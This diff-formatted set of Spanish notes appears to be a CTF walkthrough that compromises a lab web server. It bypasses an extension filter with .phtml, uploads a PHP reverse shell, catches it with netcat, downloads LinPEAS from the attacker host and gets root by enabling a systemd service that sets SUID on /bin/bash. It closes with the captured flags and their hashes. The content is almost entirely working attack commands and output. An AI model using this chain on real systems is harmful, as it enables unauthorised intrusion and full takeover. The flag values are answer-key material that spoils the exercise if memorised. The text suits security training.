+$extensions = array("phtml");
+# Solo bloquea por extensión, no valida contenido real del archivo
+
+Fuzzing de extensiones contra /internal/index.php:
+.php      -> Extension not allowed
+.php3     -> Extension not allowed
+.php4     -> Extension not allowed
+.php5     -> Extension not allowed
+.php7     -> Extension not allowed
+.phtml    -> Success
+.pht      -> Extension not allowed
+.phar     -> Extension not allowed
+
+Subida de reverse shell (pentestmonkey php-reverse-shell) renombrada shell.phtml
+curl -s -F "file=@shell.phtml" -F "submit=Submit" http://10.67.136.59:3333/internal/index.php
+
+=== Obtención de shell (www-data) ===
+nc -lvnp 1234
+(request GET /internal/uploads/shell.phtml desde navegador para disparar la shell)
+connect to [192.168.151.44] from (UNKNOWN) [10.67.136.59] 49072
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+=== Enumeración con LinPEAS ===
+wget http://192.168.151.44:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh > /tmp/linpeas_output.txt 2>&1
+# No se hallaron binarios SUID explotables directos ni credenciales válidas de otros usuarios.
+
+=== Escalada de privilegios: systemd service como root ===
+TF=/tmp/root.service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF
+systemctl link $TF
+systemctl enable --now $TF
+ls -la /bin/bash
+# -rwsr-sr-x 1 root root 1183448 Apr 18 2022 /bin/bash   (bit SUID ahora activo)
+bash -p
+whoami
+# root
+id
+# uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+
+=== Obtención de flags ===
+cat /root/root.txt
+# a58ff8579f0a9270368d33a9966c7fd5
+cat /home/bill/user.txt
+# 8bd7992fbe8a6ad22a63361004cfcedb
+
+=== Hashes SHA-256 de las flags ===
+printf 'a58ff8579f0a9270368d33a9966c7fd5' | sha256sum
+# cfbc740435ad60030304080e35131ffcaf8ac5f71b65e002f5b546aa3cda7ce8
+
+printf '8bd7992fbe8a6ad22a63361004cfcedb' | sha256sum
+# d324bd433001e5bdfe39e04d794539c15b51982a5bf6fc78efea46369b7bf956
